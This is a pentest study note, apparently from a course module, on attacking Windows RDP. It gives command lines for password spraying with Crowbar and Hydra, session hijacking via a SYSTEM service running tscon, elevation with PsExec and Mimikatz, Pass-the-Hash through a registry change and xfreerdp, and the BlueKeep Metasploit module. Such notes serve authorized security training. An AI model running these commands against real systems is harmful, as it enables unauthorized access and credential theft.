---
tags: [attack, protocol, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 2
---

# Attacking RDP

RDP attack techniques: password spraying, session hijacking via tscon, Pass-the-Hash, and CVE-2019-0708 (BlueKeep).

## Overview

RDP (TCP/3389) provides GUI access to Windows systems. It is a prime target for credential attacks and, once initial access is obtained, a pivot point via session hijacking. BlueKeep (2019) demonstrated that pre-auth RCE against RDP is catastrophic given RDP's prevalence in enterprise environments.

See [[enumeration/windows_remote_mgmt]] for RDP fingerprinting and configuration review.

## Detection

```bash
nmap -Pn -p3389 10.129.14.128
```

## Password spraying

### Crowbar

```bash
crowbar -b rdp -s 10.129.14.128/32 -U users.txt -c 'password123'
# RDP-SUCCESS : 10.129.14.128:3389 - administrator:password123
```

### Hydra

```bash
hydra -L users.txt -p 'password123' -t 4 10.129.14.128 rdp
# -t 4 reduces parallel connections (RDP throttles)
```

Account lockout is common — use password spraying (one password per many users) rather than per-user brute force.

## Connecting

```bash
# rdesktop (confirm certificate on first connect)
rdesktop -u admin -p password123 10.129.14.128

# xfreerdp (preferred — supports NLA and PTH)
xfreerdp /v:10.129.14.128 /u:administrator /p:'password123'
```

## RDP session hijacking (tscon)

With SYSTEM privileges on a Windows host that has other users connected via RDP, `tscon.exe` can take over their session without knowing their password.

```cmd
:: List active sessions
query user

:: Result shows session IDs and names
 USERNAME     SESSIONNAME   ID  STATE
>juurena      rdp-tcp#13     1  Active
 lewen         rdp-tcp#14     2  Active

:: Create a Windows service that runs as SYSTEM and switches to lewen's session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

The service spawns as LocalSystem and the `tscon` call connects you to the target session. The victim is disconnected.

**Note:** This technique does not work on Windows Server 2019+.

Getting SYSTEM first (if only local admin):

```bash
# Via PsExec
PsExec.exe -s cmd.exe

# Via Mimikatz
privilege::debug
token::elevate
```

## Pass-the-Hash (PTH) via xfreerdp

With an NT hash (no plaintext password needed):

```bash
# First, enable Restricted Admin Mode on the target if not already set
# (Requires admin command execution on target)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Then RDP with the hash
xfreerdp /v:10.129.14.128 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

`DisableRestrictedAdmin = 0` enables Restricted Admin Mode. Without it, `/pth` is rejected.

## CVE-2019-0708 — BlueKeep

Pre-authentication RCE in the RDP service via a Use-After-Free (UAF) in the virtual channel handling code. Runs as SYSTEM because RDP runs as LocalSystem.

- Affected: Windows 7, Windows Server 2008/2008 R2 (unpatched)
- Not affected: Windows 8+, Windows Server 2012+
- ~950,000 systems were vulnerable at disclosure (May 2019); ~25% still unpatched years later
- Exploit can cause BSoD — discuss with client before running
- Metasploit module: `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

```bash
# Scan for BlueKeep vulnerability
nmap -p3389 --script rdp-vuln-ms12-020 10.129.14.128
# (No dedicated BlueKeep NSE script; use Metasploit's check module)
```

## Gotchas & notes

- Hydra's RDP module is experimental — Crowbar is more reliable for RDP spraying
- PTH requires Restricted Admin Mode; check if it's already enabled before trying to set it
- Session hijacking leaves forensic traces (service creation, event logs)
- BlueKeep is notoriously unstable in production; always confirm with client

## Related pages

- [[enumeration/windows_remote_mgmt]]
- [[tools/attack/hydra]]
- [[attack/smb]] — same NT hashes work for SMB PTH
- [[tools/attack/netexec]]

## Sources

- raw/attacking_common_services/rdp_attacking_rdp.md
- raw/attacking_common_services/rdp_latest_rdp_vulnerabilities.md
